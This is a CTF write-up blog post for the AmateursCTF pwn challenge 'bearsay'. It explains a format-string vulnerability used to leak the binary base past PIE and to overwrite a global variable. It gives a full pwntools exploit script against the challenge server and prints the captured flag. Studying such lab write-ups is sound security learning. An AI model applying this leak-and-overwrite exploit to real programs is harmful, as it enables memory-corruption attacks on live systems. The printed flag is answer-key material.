---
layout: post
title: Amateur CTF | Bearsay
date: 2024-04-12
tags: ['Amateur CTF']
---
# PWN/bearsay

In this challenge we were given an elf file with `PIE,NX,canary and full RELRO enabled` , literally all the permissions were green.
But after decompiling the execuatable with GHIDRA , we found a global variable named is_mother_bear ,
basically if anyhow the value of `is_mother_bear` becomes  `0xbad0bad`  we get the flag.

but how? there exist a printf vulnerability or more specifically Format String vulnerability.

So, the path of exploitation should be like this:-

1- leak the `Base address` of the binary.
2- Change the value of global variable `is_mother_bear` to `0xbad0bad`

Since the program is being run inside a while loop we can use the format string vulnerabilty as many times as we can.
but we only need it for two times.

Fist we leak any binary address of the executable with the help of format string specifier(`%p,%x `etc.) then we can find the base address of the binary

after that with the help of pwntools inbuilt function `fmtstr_payload` we can change the value associated with the address of is_mother_bear to any diserable value.

And wollah!!! we get the flag.

```python
#!/usr/bin/env python3

from pwn import *

elf = context.binary=ELF("./chal_patched")
libc = ELF("./lib/libc.so.6")
ld = ELF("./lib/ld-linux-x86-64.so.2")

r=remote("chal.amt.rs", "1338")
r.sendlineafter(b": ",b'%15$p.%3$p')

print(r.recvline())
k=r.recvline().split(b'.')
leak = int(k[0][2:].decode(),16)
print(hex(leak))

elf.address = leak - elf.sym.main - 702
print(hex(elf.address))

print(hex(elf.sym.is_mother_bear))
payload = fmtstr_payload(22,{elf.sym['is_mother_bear'] : 0xbad0bad },write_size='short')


r.sendlineafter(b': ',payload)

r.sendlineafter(b': ',b'flag')
r.interactive()
r.close()

```

after running this script we get the flag:- `amateursCTF{bearsay_mooooooooooooooooooo?}`